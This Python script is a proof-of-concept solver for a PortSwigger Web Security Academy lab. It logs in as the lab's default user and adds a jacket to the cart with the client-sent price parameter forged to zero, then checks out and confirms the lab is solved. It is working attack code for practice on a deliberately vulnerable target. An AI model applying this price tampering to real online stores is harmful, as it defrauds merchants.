#!/usr/bin/env python3
"""
PoC: Excessive trust in client-side controls (PortSwigger Web Security Academy)

Buys the "Lightweight l33t leather jacket" by overriding the client-supplied
price parameter. The server trusts whatever price the browser sends, so we
send zero.

FOR USE ONLY against your own PortSwigger lab instance. This is educational
automation for a deliberately vulnerable practice target.

Lab: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls

Requires: pip install requests
Usage:    python3 solve.py https://YOUR-LAB-ID.web-security-academy.net
"""

import re
import sys
import requests

USERNAME = "wiener"
PASSWORD = "peter"
PRODUCT_ID = "1"        # the leather jacket
SPOOFED_PRICE = "0"     # the whole point: £0.00 (any value < store credit works)


def get_csrf(session, url):
    """Pull the CSRF token out of a page's hidden form field."""
    resp = session.get(url)
    match = re.search(r'name="csrf" value="([^"]+)"', resp.text)
    if not match:
        sys.exit(f"[-] No CSRF token found at {url} — is the lab URL correct?")
    return match.group(1)


def main(base):
    base = base.rstrip("/")
    s = requests.Session()

    # 1. Log in as a normal customer.
    csrf = get_csrf(s, f"{base}/login")
    s.post(f"{base}/login", data={
        "csrf": csrf,
        "username": USERNAME,
        "password": PASSWORD,
    })
    print(f"[+] Logged in as {USERNAME}")

    # 2. Add the jacket to the cart — but lie about the price.
    #    'price' is in pennies and the server trusts it blindly.
    s.post(f"{base}/cart", data={
        "productId": PRODUCT_ID,
        "redir": "PRODUCT",
        "quantity": "1",
        "price": SPOOFED_PRICE,
    })
    print(f"[+] Jacket added to cart at spoofed price = {SPOOFED_PRICE}")

    # 3. Place the order.
    csrf = get_csrf(s, f"{base}/cart")
    s.post(f"{base}/cart/checkout", data={"csrf": csrf})
    print("[+] Order placed.")

    # 4. Confirm by checking the lab status banner on the home page.
    if "is-solved" in s.get(base).text:
        print("[✓] Lab solved — the store banner now reads 'Solved'.")
    else:
        print("[!] Order sent, but the solved banner wasn't detected. "
              "Open the lab in a browser to confirm.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit("Usage: python3 solve.py https://YOUR-LAB-ID.web-security-academy.net")
    main(sys.argv[1])
